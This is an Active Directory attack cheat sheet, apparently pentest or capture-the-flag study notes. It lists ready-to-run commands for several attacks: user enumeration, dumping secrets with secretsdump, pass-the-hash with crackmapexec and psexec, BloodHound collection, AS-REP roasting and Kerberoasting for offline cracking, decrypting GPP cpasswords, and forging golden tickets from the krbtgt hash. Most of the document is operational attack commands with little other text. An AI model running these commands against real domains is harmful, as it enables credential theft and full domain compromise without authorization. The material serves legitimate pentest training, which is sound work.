# Cheat Sheet

## Initial Attack Vectors

### User Enumeration

### Brute Force

#### kerbrute

```bash
kerbrute userenum --dc <IP> -d <domain.local> users.txt
# Can verify working by placing known users in user.txt i.e. administrator, guest,
```

## Post-Compromise Enumeration

#### GetADUsers

Queries target domain for users data

```bash
GetADUsers.py -all -dc-ip <IP> active.htb/svc_tgs   # Will need account creds
```

#### secretsdump

Performs various techniques to dump secrets from the remote machine without executing any agent there.

```
secretsdump.py htb.local/<username>@<IP>
secretsdump.py htb.local/<username>:<password>@<IP>
# Grab the hashes then attempt to crack or pass the hash
# Pass the hash
crackmapexec smb <IP> -u administrator -H <hash>
# If Pwn3d!...
psexec.py -hashes <hash> administrator@<IP>
```

## Bloodhound

### Collection

#### SharpHound

```bash
/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
/usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
```

#### BloodHound.py

```bash
# Installation
pip3 install bloodhound
# Binary
bloodhound-python
# Command
bloodhound-python -u <username> -p <password> -ns <IP> -d <domain.local> -c All
# Copy json output file into Bloodhound
```

### Enumeration

#### Node Info

* Can search and select a specific user, machine, etc. where you can get details of it.
* Can right click on user in graph and mark as owned.
* Can right click on permission and click on Help.

#### Queries

* Find AS-REP Roastable Users (DontReqPreAuth)&#x20;
* Find Shortest Paths to Domain Admin
* Shortest Paths to Domain Admins from Owned Principals

## AS-REP Roasting

> Must have a username or list of usernames to perform

### GetNPUsers

```bash
# From Kali
GetNPUsers.py <domain.local>/<username> -dc-ip=<IP>
# Look "getting its TGT"
$krb5asrep$23$<username>@<domain.local>:12345...
# Then can attempt to brute force offline with John or Hashcat
```

## Kerberoasting

> Must have an already compromised account to authenticate with

### GetUserSPNs

```bash
# From Kali
GetUserSPNs -dc-ip <IP> <domain.local>/<compromised username>
# A list of accounts with SPNs should show along with the account name, etc.
GetUserSPNs -dc-ip <IP> <domain.local>/<compromised username> -request
# Look for the hash in the output
$krb5tgs$23$*<Username>$<domain.local$<domain.local>/<username*>$12345...
# Then can attempt to brute force offline with John or Hashcat
```

## GPP Credentials

> Must have an already compromised account to authenticate with

### Get-GPPPassword.ps1

```bash
# From Windows Target
findstr /S /I cpassword \\<domain.local>\sysvol\<domain.local>\policies\*.xml
# Look for the cpassword= value
cpassword="<value>"
# Then can attempt to decrypt them offline using PowerSploit's Get-GPPPassword.ps1
Get-GPPPassword
# Look for Password value output
```

## Silver Ticket

## Golden Ticket

### From Linux

#### Impacket

After dumping the hashes, we will use the `krbtgt` user and hash that was found.

```bash
# From Target: Get Domain SID via PowerShell cmdlet
Get-ADDomain htb.local  # Look for DomainSID
# From Kali
python ticket.py <nt-hash> -domain-sid <DomainSID> -domain htb.local <fake-username>
export KRB5CCNAME=<fake-username>.cache
# Then use psexec
psexec.py htb.local/<fake-username>@<IP> -k -no-pass  # Using IP
psexec.py htb.local/<fake-username>@<DOMAIN> -k -no-pass  # May need to user domain
# DEBUG
## Redo steps replaceing <fake-username> with administrator
# Can also try wmiexec, smbexec
```

#### Mimikatz

## Resources

#### Mind Maps

AD - [https://www.xmind.net/m/5dypm8/](https://www.xmind.net/m/5dypm8/)

General Enumeration - [https://www.xmind.net/m/QsNUEz/](https://www.xmind.net/m/QsNUEz/)

#### WADComs

[https://wadcoms.github.io/](https://wadcoms.github.io/)

#### Methodology

[https://book.hacktricks.xyz/windows/active-directory-methodology](https://book.hacktricks.xyz/windows/active-directory-methodology)

[https://www.thehacker.recipes/](https://www.thehacker.recipes/)

[https://www.ired.team/](https://www.ired.team/)

#### Resources

[https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

[https://zer1t0.gitlab.io/posts/attacking\_ad/](https://zer1t0.gitlab.io/posts/attacking\_ad/)

[https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

[https://github.com/61106960/adPEAS](https://github.com/61106960/adPEAS)

#### Writeups

[https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff](https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff)

[https://n0h4ts.medium.com/passing-the-new-oscp-b9fcd434ade7](https://n0h4ts.medium.com/passing-the-new-oscp-b9fcd434ade7)
